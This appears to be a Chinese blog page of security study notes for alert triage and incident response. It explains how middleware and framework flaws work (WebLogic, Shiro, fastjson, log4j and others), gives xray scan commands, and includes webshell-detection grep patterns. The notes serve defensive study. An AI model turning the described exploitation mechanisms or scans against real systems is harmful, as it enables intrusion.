<h4 id="设备常见的误报"><a href="#设备常见的误报" class="headerlink" title="设备常见的误报"></a>设备常见的误报</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 如果看到一个告警IP，如何判断其是否是真实的攻击？</span><br><span class="line">	首先看下告警中攻击者的IP是内网IP还是外网IP。如果是内网IP，首先根据请求包和响应包进行判断。比如看下请求包内是否有SQL语句，如果有SQL语句，并且响应包内容有执行成功的回显（就是响应包内有），那么判断确实是SQL攻击，需要上报给研判人员，让研判人员跟在场的负责人员确认下攻击的业务系统是否是业务系统本身存在这种漏洞，是否是本身的业务逻辑造成的。如果是因为本身业务逻辑造成的并且攻击者IP确认为安全的IP，那么本次攻击应当是误判，如果IP为不安全的IP（IP所有者在此期间内没有进行操作），那么可能是真实攻击行为。</span><br><span class="line">	外网攻击者IP判断是否是攻击的话，就根据请求包和响应包内容进行对比，看一下是否是恶意动作，如果是恶意动作，那么判断为真实攻击。</span><br><span class="line">	</span><br><span class="line">2. 如果看到一条SQL注入告警，怎么判断是否攻击成功？</span><br><span class="line">	根据请求包和响应包对比进行判断，比如看下请求包是否有SQL语句，如果有SQL语句（例如select version），并且响应包内容有执行成功的回显，那么判断确实是SQL攻击，并且成功了。</span><br><span class="line">	</span><br><span class="line">3. 如果看到一条文件上传的告警，怎么判断是否攻击成功？</span><br><span class="line">	根据请求包和响应包对比进行判断，看一下请求包文件名是否是恶意的脚本文件名称，请求包内容是否含有恶意脚本内容，然后看一下响应包状态码是否是200或302，如果符合上述两个特征，那么可能上传成功，上报给研判人员，让研判人员进行验证。</span><br><span class="line">	</span><br><span class="line">4. 如果看到一条命令执行的告警，怎么判断是否攻击成功？</span><br><span class="line">	根据请求包和响应包对比进行判断，看一下请求包内是否有系统命令，比如看一下请求包内是否有ipconfig，然后看下响应包回显是否有IP内容，如果确实有说明攻击成功，如果没有，说明大概率攻击未成功，但是存在恶意攻击，将此告警上报给研判人员，研判人员进行二次验证。</span><br></pre></td></tr></table></figure>

<h3 id="常见漏洞扫描工具"><a href="#常见漏洞扫描工具" class="headerlink" title="常见漏洞扫描工具"></a>常见漏洞扫描工具</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. AWVS</span><br><span class="line">2. APPscan</span><br><span class="line">3. OpenVAS</span><br><span class="line">4. Xray</span><br><span class="line">    4.1. 基于代理的被动扫描：./xray webscan --listen 127.0.0.1:7777</span><br><span class="line">    4.2. ./xray webscan --basic-crawler 目标网站</span><br><span class="line">    4.3. ./xray webscan --plugins cmd_injection --url 目标网站</span><br></pre></td></tr></table></figure>

<h3 id="中间件和框架漏洞"><a href="#中间件和框架漏洞" class="headerlink" title="中间件和框架漏洞"></a>中间件和框架漏洞</h3><h4 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IIS:</span><br><span class="line">    1. PUT漏洞：IIS server在web服务拓展中开启了webdav，配置写入权限，脚本资源访问权限，导致任意文件上传</span><br><span class="line">    2. 短文件名拆解漏洞：IIS短文件名机制，可以暴力拆解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造某个不存在的短文件名，返回400</span><br><span class="line">    3. 远程代码执行</span><br><span class="line">    4. 解析漏洞：test.asp/1.jpg会被当做asp文件来执行</span><br><span class="line">    </span><br><span class="line">Apache：</span><br><span class="line">    1. 解析漏洞：Apache默认一个文件可以有多个以点分割的后缀，比如test.php.xxx，当最右边的后缀无法识别的时候，则会向左识别，直到识别到合法的后缀才能进行解析</span><br><span class="line">    2. 目录遍历：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件</span><br><span class="line">    </span><br><span class="line">Nginx：</span><br><span class="line">    1. 目录遍历：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件</span><br><span class="line">    2. CRLF注入：由于Nginx没有正确地处理HTTP请求中的换行符和回车符导致的。攻击者可以在HTTP请求中注入特殊的CRLF字符序列，从而执行任意的命令或者篡改HTTP响应</span><br><span class="line">    3. 目录穿越：NGINX在配置别名的时候，如果忘记加/，将造成目录穿越漏洞</span><br><span class="line"></span><br><span class="line">Tomcat：</span><br><span class="line">    1. 远程代码执行：当tomcat启用了HTTP的put方法，攻击者就可能通过精心构造的攻击请求数据包向服务器上传包含任意代码的jsp文件，jsp文件中的恶意代码将能被服务器执行。</span><br><span class="line">    2. war后门文件部署：tomcat支持后台文件部署war后门，可以直接将webshell部署到web目录下</span><br><span class="line"></span><br><span class="line">jboss：</span><br><span class="line">    1. 反序列化漏洞</span><br><span class="line">    2. war后门文件部署</span><br><span class="line">    </span><br><span class="line">weblogic：</span><br><span class="line">    1. Java反序列化：该漏洞通过t3协议（Oracle WebLogic Server中使用的自定义协议，是基于Java对象序列化和反序列化机制，通过网络传输Java对象）触发，可导致未授权的用户在远程服务器执行任意命令</span><br><span class="line">    2. weblogic未授权RCE：允许后台任意用户通过HTTP协议执行任意命令</span><br><span class="line">    3. weblogic任意文件上传：weblogic web service test page中存在任意文件上传，攻击者可以通过任意jsp文件来getshell</span><br></pre></td></tr></table></figure>

<h4 id="常见框架漏洞"><a href="#常见框架漏洞" class="headerlink" title="常见框架漏洞"></a>常见框架漏洞</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Struts2：</span><br><span class="line">	1. Struts2代码执行：【允许攻击者通过构造恶意OGNL表达式来执行任意代码】Struts2框架中的Action类允许开发人员使用OGNL表达式处理用户请求，攻击者利用应用程序未正确验证或过滤用户输入的缺陷，构造恶意输入，然后应用程序会将输入作为OGNL表达式进行解析和执行，就可能导致恶意代码的执行。（任意代码执行、系统命令执行、文件读取、数据库操作）</span><br><span class="line">	2. Struts2 OGNL注入漏洞：当应用程序未正确验证或过滤用户输入时，攻击者可以通过构造恶意的OGNL表达式注入恶意代码</span><br><span class="line">	3. XML解析漏洞：当Struts2应用程序使用XML解析功能时，存在潜在的XXE漏洞。</span><br><span class="line">	4. 文件上传漏洞：如果应用程序未正确验证和处理用户上传的文件，攻击者可以上传恶意文件，并执行任意代码或篡改系统文件</span><br><span class="line"></span><br><span class="line">thinkphp：</span><br><span class="line">	1. SQL注入：当应用程序未正确过滤和转义用户输入时，攻击者可以通过构造恶意的SQL查询语句来执行未经授权的数据库操作</span><br><span class="line">	2. 反序列化漏洞：如果应用程序在反序列化用户提供的数据时存在漏洞，攻击者可以构造恶意序列化数据，导致执行任意代码</span><br><span class="line">	3. 远程命令执行漏洞：当应用程序在执行系统命令时未正确验证或过滤用户输入，攻击者可以通过构造恶意的命令注入漏洞执行任意系统命令</span><br><span class="line"></span><br><span class="line">spring：</span><br><span class="line">	1. Spring远程命令执行：当应用程序在处理用户输入时，未正确验证或过滤数据，攻击者可以构造恶意的输入来执行任意代码</span><br><span class="line">	2. 未授权访问：如果应用程序在访问受限资源时存在授权验证缺陷，攻击者可以绕过身份验证和访问控制，获取未经授权的访问权限</span><br><span class="line">	3. 反序列化漏洞：如果应用程序在反序列化用户提供的数据时存在漏洞，攻击者可以构造恶意序列化数据，导致执行任意代码</span><br></pre></td></tr></table></figure>

<h4 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h4><h5 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h5><ul>
<li>log4j漏洞原理：这是一个基于Java的日志记录工具，由于log4j2某些功能存在递归解析功能，攻击者可以直接构造恶意请求，触发远程代码执行。</li>
<li>log4j 2漏洞原理：log4j 2是Java语言的日志处理套件，使用极其广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过lookup进行JNDI注入，执行任意代码。</li>
</ul>
<h5 id="log4j远程代码执行漏洞"><a href="#log4j远程代码执行漏洞" class="headerlink" title="log4j远程代码执行漏洞"></a>log4j远程代码执行漏洞</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">Log4j 是Apache 的一个开源项目，是一款基于Java 的开源日志记录工具。该漏洞主要是由于日志在打印时当遇到$&#123;后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</span><br><span class="line"></span><br><span class="line">具体操作：</span><br><span class="line">在正常的log处理过程中对$&#123;这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行</span><br></pre></td></tr></table></figure>

<h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><h5 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断：</span><br><span class="line">正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断。</span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line">fastjson是阿里巴巴开发的一款将json字符串和java对象进行序列化和反序列化的开源json解析库。fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</span><br><span class="line"></span><br><span class="line">无回显怎么办：</span><br><span class="line">1.一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</span><br><span class="line">2.通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</span><br><span class="line">3.直接将命令执行结果回显到请求Poc的HTTP响应中</span><br></pre></td></tr></table></figure>

<h5 id="fastjson不出网利用链"><a href="#fastjson不出网利用链" class="headerlink" title="fastjson不出网利用链"></a>fastjson不出网利用链</h5><ul>
<li>TemplatesImpl利用链：<ul>
<li>这个利用链有限制，由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22~1.2.24</li>
<li>使用条件：<ul>
<li>parseObject(input,Object.class,Feature.SupportNonPublicField)</li>
<li>parse(input,Feature.SupportNonPublicField)</li>
</ul>
</li>
</ul>
</li>
<li>BCEL字节码利用</li>
</ul>
<h4 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h4><h5 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">Shiro是Apache下的一个开源Java安全框架，执行身份认证，授权，密码和会话管理。shiro在用户登录时除了账号密码外还提供了可传递选项remember me。用户在登录时如果勾选了remember me选项，那么在下一次登录时浏览器会携带cookie中的remember me字段发起请求，就不需要重新输入用户名和密码。</span><br><span class="line"></span><br><span class="line">判断：</span><br><span class="line">1.数据返回包中包含rememberMe=deleteMe字段。</span><br><span class="line">2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：****rememberMe=然后查看返回数据包中是否存在关键字。</span><br><span class="line"></span><br><span class="line">shiro-550：</span><br><span class="line">shiro反序列化漏洞利用有两个关键点，首先是在shiro&lt;1.2.4时，AES加密的密钥Key被硬编码在代码里，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据。另外就是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。攻击者构造恶意代码，并且序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行编码，解密并且反序列化，最终造成反序列化漏洞。</span><br><span class="line"></span><br><span class="line">shiro-721：</span><br><span class="line">不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的Remember。</span><br></pre></td></tr></table></figure>

<h4 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h4><p>端口：7001</p>
<h5 id="weblogic反序列化"><a href="#weblogic反序列化" class="headerlink" title="weblogic反序列化"></a>weblogic反序列化</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLDecoder反序列化：weblogic的WLS security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</span><br><span class="line"></span><br><span class="line">weblogic T3协议反序列化命令执行：远程攻击者通过T3协议在weblogic server中执行反序列化操作，利用RMI（远程方法调用）机制的缺陷，通过JRMP（Java远程方法协议）达到任意反序列化代码，进而造成远程代码执行。</span><br></pre></td></tr></table></figure>



<h3 id="常见安全设备"><a href="#常见安全设备" class="headerlink" title="常见安全设备"></a>常见安全设备</h3><h4 id="入侵检测系统IPS"><a href="#入侵检测系统IPS" class="headerlink" title="入侵检测系统IPS"></a>入侵检测系统IPS</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是计算机网络安全设施，是对防病毒软件和防火墙的补充。入侵预防系统是一部能够监视网络或网络设备的网络数据传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络数据传输行为。</span><br></pre></td></tr></table></figure>

<h4 id="入侵防御系统IDS"><a href="#入侵防御系统IDS" class="headerlink" title="入侵防御系统IDS"></a>入侵防御系统IDS</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">积极主动的防护措施，按照一定的安全策略，通过软件，硬件对网络，系统的运行进行实时的监控，尽可能地发现网络攻击行为，积极主动的处理攻击，保证网络资源的机密性，完整性和可用性。</span><br></pre></td></tr></table></figure>

<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">防火墙是位于两个(或多个)网络间，实行网络间访问或控制的一组组件集合之硬件或软件。隔离网络，制定出不同区域之间的访问控制策略来控制不同信任程度区域间传送的数据流。</span><br></pre></td></tr></table></figure>

<h4 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是针对内部运维人员的运维安全审计系统。主要功能是对运维人员的运维操作进行审计和权限控制(比如要登录某些平台或者系统只能通过堡垒机才可以，不用堡垒机是无法访问的)。同时堡垒机还有账号集中管理，单点登录(在堡垒机上登录即可实现对多个其他平台的无密登录)等功能。</span><br></pre></td></tr></table></figure>

<h4 id="态势感知平台"><a href="#态势感知平台" class="headerlink" title="态势感知平台"></a>态势感知平台</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以大数据平台为基础，通过收集多元，异构的海量日志，利用关联分析，机器学习，威胁情报，可视化等技术，帮助用户持续监测网络安全态势，实现从被动防御向积极防御的进阶。</span><br></pre></td></tr></table></figure>

<h4 id="终端安全管理系统"><a href="#终端安全管理系统" class="headerlink" title="终端安全管理系统"></a>终端安全管理系统</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是集防病毒，终端安全管控，终端准入，终端审计，外设管控，EDR等功能于一体，兼容不同操作系统和计算机平台，帮助客户实现平台一体化，功能一体化，数据一体化的终端安全立体防护。</span><br></pre></td></tr></table></figure>

<h4 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAF是以网站或应用系统为核心的安全产品，通过对HTTP或HTTPS的Web攻击行为进行分析并拦截，有效的降低网站安全风险。产品主要部署在网站服务器的前方。通过特征提取和分块检索技术进行模式匹配来达到过滤，分析，校验网络请求包的目的，在保证正常网络应用功能的同时，隔绝或者阻断无效或者非法的攻击请求。</span><br></pre></td></tr></table></figure>

<h5 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAF分为非嵌入型WAF和嵌入型WAF，非嵌入型指的是硬WAF、云WAF、虚拟机WAF之类的；嵌入型指的是web容器模块类型WAF、代码层WAF。</span><br></pre></td></tr></table></figure>

<h5 id="WAF的原理"><a href="#WAF的原理" class="headerlink" title="WAF的原理"></a>WAF的原理</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Web应用防火墙是通过执行一系列针对HTTP或者HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</span><br></pre></td></tr></table></figure>

<h4 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蜜罐是一种安全威胁的主动防御技术，它通过模拟一个或多个易受攻击的主机或服务来吸引攻击者，捕获攻击流量与样本，发现网络威胁，提取威胁特征，蜜罐的价值在于被探测，攻陷。</span><br></pre></td></tr></table></figure>

<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><h4 id="如何判断攻击是通过什么漏洞攻击的"><a href="#如何判断攻击是通过什么漏洞攻击的" class="headerlink" title="如何判断攻击是通过什么漏洞攻击的"></a>如何判断攻击是通过什么漏洞攻击的</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 审查日志：仔细检查服务器的日志文件，包括系统日志、web服务器日志、应用程序日志等；特别要关注失败的身份验证尝试、异常URL请求、异常的命令执行等</span><br><span class="line">2. 网络流量分析：分析服务器的网络流量，使用网络流量分析工具检测异常的网络连接、数据包捕获和协议分析，查看来自外部网络的异常流量和不寻常的通信模式</span><br><span class="line">3. 漏洞扫描和渗透测试结果</span><br><span class="line">4. 威胁情报和公开漏洞信息</span><br><span class="line">5. 恶意软件分析</span><br></pre></td></tr></table></figure>

<h4 id="挖矿病毒判断"><a href="#挖矿病毒判断" class="headerlink" title="挖矿病毒判断"></a>挖矿病毒判断</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">挖矿木马占用系统资源进行挖矿行为，一般电脑有以下特征：</span><br><span class="line">    1. 系统响应缓慢</span><br><span class="line">    2. CPU/显卡使用率过高</span><br><span class="line">    3. 内存/带宽占用高</span><br><span class="line">登录可疑主机之后，通过以下方式来确定是否有挖矿木马：</span><br><span class="line">    1. 查看进程：系统命令ps、ls可能被替换</span><br><span class="line">    2. 检查日志、检查系统用户</span><br><span class="line">    3. 检查是否有异常文件</span><br></pre></td></tr></table></figure>

<h4 id="清除挖矿木马"><a href="#清除挖矿木马" class="headerlink" title="清除挖矿木马"></a>清除挖矿木马</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 原因排查</span><br><span class="line">2. 清除木马：</span><br><span class="line">	（1）及时隔离主机；</span><br><span class="line">	（2）删除文件、阻断与矿池通讯；</span><br><span class="line">	（3）清除定时任务；</span><br><span class="line">	（4）清除自启动项；</span><br><span class="line">	（5）kill挖矿进程</span><br></pre></td></tr></table></figure>

<h4 id="木马驻留系统的方式"><a href="#木马驻留系统的方式" class="headerlink" title="木马驻留系统的方式"></a>木马驻留系统的方式</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 注册表</span><br><span class="line">2. 服务</span><br><span class="line">3. 启动目录</span><br><span class="line">4. 计划任务</span><br><span class="line">5. 关联文件类型</span><br></pre></td></tr></table></figure>

<h4 id="查看异常端口进程情况"><a href="#查看异常端口进程情况" class="headerlink" title="查看异常端口进程情况"></a>查看异常端口进程情况</h4><p><code>netstat -anltp|grep bash</code></p>
<h4 id="如何查看网站是否存在webshell"><a href="#如何查看网站是否存在webshell" class="headerlink" title="如何查看网站是否存在webshell"></a>如何查看网站是否存在webshell</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 网站根目录/* -type f -name &quot;*.php&quot; |xargs grep &quot;eval|assert|system&quot;</span><br></pre></td></tr></table></figure>

<h4 id="服务器存在webshell如何处理（网站被上传webshell如何处理）"><a href="#服务器存在webshell如何处理（网站被上传webshell如何处理）" class="headerlink" title="服务器存在webshell如何处理（网站被上传webshell如何处理）"></a>服务器存在webshell如何处理（网站被上传webshell如何处理）</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 及时隔离主机</span><br><span class="line">2. 定位事件范围：查看webshell创建的时间，对webshell进行取样分析</span><br><span class="line">3. 通过创建时间和日志进行综合分析，以确定系统存在的漏洞</span><br><span class="line">4. 清除webshell以及残余文件，修复漏洞</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">1. 首先关闭网站，下线服务。有必要的话将服务器断网隔离；</span><br><span class="line">2. 手工结合工具进行检测；</span><br><span class="line">	2.1. 工具可以使用D盾、河马webshell查杀、百度在线webshell查杀等工具对网站目录进行排查查杀</span><br><span class="line">	2.2. 手工方面对比未上传webshell之前备份的文件，从文件或者代码层面进行对比</span><br><span class="line">3. 加强安全策略，例如：定期备份网站配置文件，及时安装服务器补丁，定时更新安全防护软件，定期修改密码等措施。</span><br></pre></td></tr></table></figure>

<h4 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">数据库类：（扫描弱口令）</span><br><span class="line">    1433：mssql</span><br><span class="line">    1521：oracle</span><br><span class="line">    3306：MySQL</span><br><span class="line">特殊服务：（未授权/命令执行）</span><br><span class="line">    443：SSL心脏滴血</span><br><span class="line">    6379：Redis未授权访问</span><br><span class="line">    7001、7002：weblogic默认弱口令</span><br><span class="line">    27017、27018：MongoDB未授权</span><br><span class="line">常见端口：（弱口令/端口爆破）</span><br><span class="line">    21：FTP弱口令、ms12-073</span><br><span class="line">    25：SMTP简单邮件传输服务器端口</span><br><span class="line">    23：telnet端口，弱口令</span><br><span class="line">    22：ssh，弱口令</span><br><span class="line">    53：dns端口</span><br><span class="line">    445：SMB，ms08-067、ms17-010和IPC$攻击手段</span><br></pre></td></tr></table></figure>

<h4 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击规则匹配，通过正则匹配日志中的攻击请求</span><br><span class="line">2. 统计方法，统计请求出现的次数，次数少于同类请求平均次数则为异常请求</span><br><span class="line">3. 白名单模式，为正常请求建立白名单，不在名单范围内的则为异常请求</span><br><span class="line">4. 借助日志分析工具</span><br></pre></td></tr></table></figure>

<h4 id="Windows和Linux的日志存放位置"><a href="#Windows和Linux的日志存放位置" class="headerlink" title="Windows和Linux的日志存放位置"></a>Windows和Linux的日志存放位置</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows：</span><br><span class="line">    系统日志：%systemroot%\system32\winevt\logs\system.evtx</span><br><span class="line">    应用程序日志：%systemroot%\system32\winevt\logs\application.evtx</span><br><span class="line">    安全日志：%systemroot%\system32\winevt\logs\security.evtx</span><br><span class="line">Linux：</span><br><span class="line">    日志默认存放位置：/var/log</span><br><span class="line">    查看日志配置情况：more /etc/rsyslog.conf</span><br></pre></td></tr></table></figure>

<h4 id="常见中间件的配置文件路径"><a href="#常见中间件的配置文件路径" class="headerlink" title="常见中间件的配置文件路径"></a>常见中间件的配置文件路径</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache：/etc/httpd/conf</span><br><span class="line">Nginx：/etc/nginx</span><br><span class="line">iis7：C:\windows\system32\inetsrv\config\</span><br></pre></td></tr></table></figure>

<h4 id="常见的waf"><a href="#常见的waf" class="headerlink" title="常见的waf"></a>常见的waf</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 云waf</span><br><span class="line">2. web防护软件</span><br><span class="line">3. 硬件web防火墙</span><br></pre></td></tr></table></figure>

<h4 id="waf有哪些防护方式"><a href="#waf有哪些防护方式" class="headerlink" title="waf有哪些防护方式"></a>waf有哪些防护方式</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. web基础防护</span><br><span class="line">2. CC攻击防护</span><br><span class="line">3. IP黑白名单</span><br><span class="line">4. 地理位置访问控制</span><br><span class="line">5. 网页防篡改</span><br><span class="line">6. 防敏感信息泄露</span><br></pre></td></tr></table></figure>

<h4 id="Java中常见的关键字"><a href="#Java中常见的关键字" class="headerlink" title="Java中常见的关键字"></a>Java中常见的关键字</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. SPI：服务供应接口</span><br><span class="line">2. RMI：Java远程方法调用</span><br><span class="line">3. LDAP：轻量级目录访问协议</span><br><span class="line">4. CORBA：通用对象请求代理架构</span><br></pre></td></tr></table></figure>

